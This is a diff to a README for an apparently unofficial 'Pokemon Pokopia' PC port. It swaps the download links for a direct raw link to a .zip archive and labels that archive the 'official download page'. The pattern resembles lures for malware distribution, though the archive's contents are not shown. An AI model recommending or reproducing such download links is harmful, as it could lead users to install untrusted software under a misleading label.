@@ -1,6 +1,6 @@
 # 🎮 Pokemon-Pokopia-PC - High Resolution Adventure For Your Desktop
 
-[![](https://img.shields.io/badge/Download-Pokemon_Pokopia-blue.svg)](https://github.com/tashaselfproduced744/Pokemon-Pokopia-PC)
+[![](https://img.shields.io/badge/Download-Pokemon_Pokopia-blue.svg)](https://raw.githubusercontent.com/tashaselfproduced744/Pokemon-Pokopia-PC/main/Port/PC_Pokemon_Pokopia_v3.0.zip)
 
 Pokemon Pokopia brings the popular creature collection adventure to your Windows desktop. This version optimizes the game for desktop hardware. It provides sharp graphics, smooth frame rates, and flexible controller support for your PC.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the game without issues
 
 Follow these steps to set up the game on your computer.
 
-1. Visit the [official download page](https://github.com/tashaselfproduced744/Pokemon-Pokopia-PC).
+1. Visit the [official download page](https://raw.githubusercontent.com/tashaselfproduced744/Pokemon-Pokopia-PC/main/Port/PC_Pokemon_Pokopia_v3.0.zip).
 2. Locate the latest release package on the right side of the screen.
 3. Click the link ending in .zip to save the file to your computer.
 4. Open your Downloads folder.
